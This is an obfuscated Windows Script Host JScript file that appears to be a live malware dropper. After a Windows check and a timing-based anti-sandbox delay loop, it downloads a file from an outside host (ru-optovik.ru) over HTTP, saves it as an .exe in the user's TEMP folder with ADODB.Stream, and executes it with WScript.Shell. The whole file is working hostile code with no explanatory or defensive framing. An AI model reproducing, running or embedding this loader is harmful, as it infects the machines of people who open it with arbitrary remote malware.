var _JC = false;
var _EL = "CreateObject";
var _IM = function _U() {return WScript[_EL]("WScript"+".Shell");}(), _A1 = 11;
var _Y0 = "MSXML2.XMLHTTP";
var _R0 = 2123213;
var _X = 0;
function _D(_KE){_IM["Run"](_KE, _X, _X);};
function _EH(){return _Y0 + "";};
function _A(_FK, _Z){_X = _X * 1; return _FK - _Z;};
function _Q(){return _EL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _JC = true;
  @end
@*/
if (_JC)
{
var _K = "";
function _F(){return 22;};
var _XX = 0; var _X1 = 0;
function _YA()
{
var _T = new this["Date"]();
var _KP = _T["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _T = new this["Date"]();
var _Y = _T["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _T = new this["Date"]();
var _A0 = _T["getUTCMilliseconds"]();
var _XX = "_X0";
_XX = _A(_Y, _KP);
var _X1 = "_C";
_X1 = _A(_A0, _Y);
_K = "open";
return _A(_XX, _X1);
}
var _SZ = false;
var _RJ = false;
for (var _Q0 = _X; _Q0 < _F() * 1; _Q0++){if (_YA() != _X){
_SZ = true; 
_X1 = "31" + 11 * _XX + _X1; 
_RJ = true; 
break;
}}
function _AU() {return ((_SZ == true) && (_SZ == _RJ)) ? 1 : _X;};
if (_SZ && _AU() && _RJ){
function _RB() {return _IM["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nCCBGfq3vMN.ex" + "e";};
 _M = _EH();
 _TX = WScript[_EL](_M);
 var _XM = 1;
 while (_XM){
try {
	if (_XM == 1)
	{
		_TX[_K]("GET", "http://ru-optovik.ru/j9ssl", false);
		_TX["send"]();
		_SR = "Sleep";
	}
	WScript[_SR](_F() + 120); 
	if (_TX["readystate"] < 2 * 2) continue;
	_XM = _X;
	function _N(_R) {var _JG = (1, 2, 3, 4, 5, _R); return _JG;};
	_FD = WScript[_Q()]("ADODB.Stream");
	_M = _FD;
	_M[_K]();
	_M["type"] = _N(1);
	_M["write"](_TX["ResponseBody"]);
	_FD["position"] = _N(_X);
	_M["Save" + "ToFile"](_RB(), 2);
	_FD["cl"+"ose"]();
	_W = _RB();
	_D(_W);
} catch(_LB){};
}
}
}

